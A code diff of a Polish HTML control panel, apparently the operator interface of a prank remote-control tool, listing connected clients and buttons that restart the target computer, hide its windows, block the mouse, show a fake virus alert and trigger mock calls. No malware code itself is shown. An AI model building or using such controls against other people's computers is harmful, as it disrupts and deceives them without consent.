@@ -204,13 +204,13 @@
 <body>
     <div class="container">
         <header>
-            <h1>🖥️ Panel Kontrolny Klientów</h1>
+            <h1>Do robienia szpontów</h1>
             <div class="status">Serwer Online</div>
         </header>
         
         <div class="main-content">
             <div class="clients-section">
-                <h2>📱 Podłączeni Klienci</h2>
+                <h2>Podłączeni Klienci</h2>
                 <div class="client-selector">
                     <p>Wybierz klienta do sterowania:</p>
                     <div id="clientList" class="client-list">
@@ -221,25 +221,15 @@
             </div>
             
             <div class="commands-section">
-                <h2>🎮 Dostępne Komendy</h2>
+                <h2>Dostępne Komendy</h2>
                 <p id="selectedClientInfo">Nie wybrano klienta</p>
                 
                 <div class="command-buttons">
-                    <button class="command-btn" onclick="sendCommand('start')">🚀 Start Programu</button>
-                    <button class="command-btn" onclick="sendCommand('stop')">🛑 Stop Programu</button>
-                    <button class="command-btn warning" onclick="sendCommand('epstine')">👨‍🦱 Epstine Start</button>
-                    <button class="command-btn warning" onclick="sendCommand('stopepstine')">❌ Epstine Stop</button>
-                    <button class="command-btn" onclick="sendCommand('hideallwindows')">🪟 Ukryj wszystkie okna</button>
-                    <button class="command-btn" onclick="sendCommand('call elon musk')">📞 Zadzwoń do Elona Muska</button>
-                    <button class="command-btn" onclick="sendCommand('call donald trump')">📞 Zadzwoń do Donalda Trumpa</button>
-                    <button class="command-btn" onclick="sendCommand('call epstine')">📞 Zadzwoń do Epstine</button>
-                    <button class="command-btn warning" onclick="sendCommand('powiadomienie epstine')">🔔 Powiadomienie Epstine</button>
-                    <button class="command-btn danger" onclick="sendCommand('fake virus alert')">⚠️ Fałszywy alert wirusa</button>
-                    <button class="command-btn" onclick="sendCommand('powiadomienie test')">📨 Testowe powiadomienie</button>
-                    <button class="command-btn danger" onclick="sendCommand('restart')">🔄 Restart komputera</button>
-                    <button class="command-btn" onclick="sendCommand('error sound')">🔊 Dźwięk błędu</button>
-                    <button class="command-btn" onclick="sendCommand('mouse block')">Zablokuj</button>
-                    <button class="command-btn" onclick="sendCommand('mouse unblock')">Odblokuj</button>
+                    <button class="command-btn danger" onclick="sendCommand('reset')">Restart komputera</button>
+                    <button class="command-btn" onclick="sendCommand('hideallwindows')">Ukryj wszystkie okna</button>
+                    <button class="command-btn" onclick="sendCommand('call musk')">Elona Muska</button>
+                    <button class="command-btn" onclick="sendCommand('call trump')">Donalda Trumpa</button>
+                    <button class="command-btn" onclick="sendCommand('call epstine')">Epstine</button>   
                 </div>
                 
                 <div style="margin-top: 20px;">
